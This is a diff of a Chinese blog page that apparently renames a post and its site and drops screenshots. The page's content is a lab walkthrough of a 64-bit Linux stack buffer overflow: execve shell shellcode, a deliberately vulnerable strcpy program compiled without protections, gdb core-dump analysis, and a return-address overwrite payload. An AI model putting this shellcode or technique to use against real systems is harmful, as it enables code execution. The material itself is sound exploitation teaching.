@@ -104,19 +104,15 @@
 <meta name="description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
 <meta name="keywords" content="linux,栈溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【实验】linux x64栈溢出">
-<meta property="og:url" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/index.html">
-<meta property="og:site_name" content="呆萌的技术笔记">
+<meta property="og:title" content="【pwn】linux x64栈溢出">
+<meta property="og:url" content="http://www.beesfun.com/2017/10/11/【pwn】linux-x64栈溢出/index.html">
+<meta property="og:site_name" content="Ethan&#39;s Blog">
 <meta property="og:description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/001.png">
-<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/003.png">
-<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/004.png">
-<meta property="og:updated_time" content="2017-10-11T12:23:09.000Z">
+<meta property="og:updated_time" content="2019-02-22T06:06:27.860Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【实验】linux x64栈溢出">
+<meta name="twitter:title" content="【pwn】linux x64栈溢出">
 <meta name="twitter:description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
-<meta name="twitter:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/001.png">
 
 
 
@@ -146,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/"/>
+  <link rel="canonical" href="http://www.beesfun.com/2017/10/11/【pwn】linux-x64栈溢出/"/>
 
 
 
 
 
-  <title>【实验】linux x64栈溢出 | 呆萌的技术笔记</title>
+  <title>【pwn】linux x64栈溢出 | Ethan's Blog</title>
   
 
 
@@ -182,7 +178,7 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">呆萌的技术笔记</span>
+        <span class="site-title">Ethan's Blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -289,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/">
+    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/10/11/【pwn】linux-x64栈溢出/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ethan">
@@ -298,7 +294,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="呆萌的技术笔记">
+      <meta itemprop="name" content="Ethan's Blog">
     </span>
 
     
@@ -306,7 +302,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">【实验】linux x64栈溢出</h1>
+          <h1 class="post-title" itemprop="name headline">【pwn】linux x64栈溢出</h1>
         
 
         <div class="post-meta">
@@ -341,8 +337,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制安全</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -359,8 +355,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/10/11/【实验】linux-x64栈溢出/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/10/11/【实验】linux-x64栈溢出/" itemprop="commentsCount"></span>
+                <a href="/2017/10/11/【pwn】linux-x64栈溢出/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/10/11/【pwn】linux-x64栈溢出/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -408,7 +404,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -gdwarf-3 xxx.c -o xxx</span><br></pre></td></tr></table></figure>
 <h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>对栈溢出的利用，通常是覆盖返回地址，指向自shellcode的地址，从而执行shellcode。因此，这里先解决shellcode的编写问题。参考：<a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a>。首先编写汇编文件，验证shellcode功能，然后再提取机器码。使用<code>AT&amp;T</code>风格编写汇编文件如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    xor %esi, %esi</span><br><span class="line">    # /bin//sh</span><br><span class="line">    movabs $0x68732f2f6e69622f, %rbx</span><br><span class="line">    push %rsi</span><br><span class="line">    push %rbx</span><br><span class="line">    push %rsp</span><br><span class="line">    pop %rdi</span><br><span class="line">    pushq $59</span><br><span class="line">    pop %rax</span><br><span class="line">    xor %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
-<img src="/2017/10/11/【实验】linux-x64栈溢出/001.png">
+
 <p>提取机器码:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(objdump -d tmp | grep <span class="string">"^ "</span> | cut -f2); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">'\x'</span><span class="variable">$i</span>; <span class="keyword">done</span>; <span class="built_in">echo</span></span><br><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure>
 <h2 id="编写栈溢出程序"><a href="#编写栈溢出程序" class="headerlink" title="编写栈溢出程序"></a>编写栈溢出程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">256</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA"</span>;</span><br><span class="line">    overflow(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -423,10 +419,10 @@
 <h3 id="GDB获取真实内存地址"><a href="#GDB获取真实内存地址" class="headerlink" title="GDB获取真实内存地址"></a>GDB获取真实内存地址</h3><p>首先启用内核转储：<code>ulimit -c unlimited</code>。该方法只在当前shell中生效，永久生效可以修改<code>/etc/profile</code>, 添加：<code>ulimit -c unlimited</code>。缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb &lt;程序可执行文件&gt; &lt;coredump转储文件&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ulimit</span> -c unlimited</span><br><span class="line">$ ./pwn</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">$ gdb pwn core</span><br><span class="line"></span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from pwn...done.</span><br><span class="line">[New LWP 11347]</span><br><span class="line">Core was generated by `./pwn<span class="string">'.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x00007fffffffdc10 in ?? ()</span></span><br></pre></td></tr></table></figure>
-<img src="/2017/10/11/【实验】linux-x64栈溢出/003.png">
+
 <p>从上图可以看出shellcode地址，修改payload为: </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">256</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xdc\xff\xff\xff\x7f"</span>;</span><br></pre></td></tr></table></figure>
-<p>重新编译运行。<br><img src="/2017/10/11/【实验】linux-x64栈溢出/004.png"></p>
+<p>重新编译运行。<br></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
 <li><a href="https://www.exploit-db.com/docs/33698.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/33698.pdf</a></li>
 <li><a href="http://www.therabb1thole.co.uk/tutorial/linux-64-bit-buffer-overflow-tutorial/" target="_blank" rel="noopener">Linux 64-bit Buffer Overflow Tutorial</a></li>
@@ -452,7 +448,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/" title="【实验】linux x64栈溢出">http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/</a>
+    <a href="http://www.beesfun.com/2017/10/11/【pwn】linux-x64栈溢出/" title="【pwn】linux x64栈溢出">http://www.beesfun.com/2017/10/11/【pwn】linux-x64栈溢出/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -582,7 +578,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-count">58</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -593,7 +589,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -604,7 +600,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">65</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
